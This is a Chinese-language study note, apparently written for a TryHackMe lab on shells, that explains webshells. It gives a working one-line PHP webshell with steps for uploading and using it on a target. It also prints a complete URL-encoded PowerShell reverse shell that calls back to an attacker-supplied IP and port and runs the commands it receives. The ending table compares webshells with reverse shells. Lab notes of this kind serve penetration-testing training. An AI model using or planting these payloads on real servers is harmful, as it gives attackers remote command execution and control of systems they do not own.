> [!info] LINK & TAG
> [TryHackMe | What the Shell?](https://tryhackme.com/room/introtoshells)
> 
> #tag
# Webshell 技術筆記

## 1. 什麼是 Webshell？

Webshell 是一種腳本，運行在網頁伺服器（如 PHP, ASP, JSP）中，允許用戶透過網頁介面執行伺服器指令。

- **運作原理**：使用者透過 HTML 表單或 URL 參數輸入指令，腳本在伺服器後端執行後，將結果回傳至瀏覽器頁面。
    
- **應用場景**：
    
    - 存在防火牆出站限制（阻止了反彈連線）。
        
    - 作為從網頁漏洞提升到完全 Reverse/Bind Shell 的跳板。
        

---

## 2. 基礎 PHP Webshell (One-liner)

這是最簡單的一行代碼，適用於大多數 PHP 環境。

### **原始碼：**

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

### **使用方式：**

1. 將此檔案（例如命名為 `shell.php`）上傳至目標伺服器。
    
2. 透過瀏覽器訪問該檔案並加上 cmd 參數：
    
    http://target.com/shell.php?cmd=whoami
    
3. 頁面將會顯示指令執行後的結果。
    

---

## 3. Kali Linux 內建 Webshell 資源

Kali Linux 在以下路徑預裝了許多常用的 Webshell：

- **路徑**：`/usr/share/webshells`
    
- **推薦工具**：
    
    - **PentestMonkey PHP Reverse Shell**：一個完整的 PHP 腳本，執行後可直接彈回一個互動式 Shell。
        
    - **注意**：這類腳本通常針對 Unix 系統（Linux），直接在 Windows 上執行通常會失效。
        

---

## 4. 進階：從 Webshell 獲取 RCE

如果你在 Windows 伺服器上獲得了一個基礎 Webshell，可以嘗試透過 URL 編碼後的 PowerShell 指令來獲取完整的反彈 Shell。

### **URL 編碼的 PowerShell 反彈 Shell：**

將以下代碼放入 URL 的 `?cmd=` 參數後（請記得替換 `<IP>` 與 `<PORT>`）：

Plaintext

```
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

---

## 5. 總結：Webshell 與其他 Shell 的區別

|**特性**|**Webshell**|**Reverse Shell**|
|---|---|---|
|**通訊協定**|HTTP / HTTPS (80, 443)|TCP / UDP (自定義端口)|
|**交互性**|較低（通常是一次性指令回傳）|高（互動式終端）|
|**穩定性**|極高（只要 Web 服務開著就能用）|中等（容易受網絡波動或 Ctrl+C 影響）|
|**防火牆繞過**|極佳（通常伺服器必須對外開放 80/443）|較差（可能被阻擋外連連線）|
